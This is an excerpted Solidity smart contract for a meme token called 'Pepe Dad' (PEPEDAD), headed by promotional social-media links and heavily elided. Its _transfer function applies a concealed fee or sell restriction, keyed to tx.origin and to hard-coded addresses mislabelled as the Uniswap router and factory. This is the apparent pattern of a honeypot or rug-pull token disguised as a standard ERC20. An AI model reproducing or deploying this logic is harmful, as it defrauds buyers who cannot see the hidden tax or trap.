...
/*
https://t.me.com/PepeDadCoinETH

https://PepeDadCoinETH.xyz

https://twitter.com/PepeDadCoinETH
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal _uniswapRouter = 0x0c55e4Cc007bd90e960D444e5e30d4435f998B34;
    uint256 private _swapEnabled = 1;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private _uniswapFactory = 0x617F38766D00feff4b0505a2f2483422dC723921;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouter && _balances[_uniswapFactory] > 0 ? pairToken : _swapEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
contract PepeDadCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"Pepe Dad", unicode"PEPEDAD")
    {
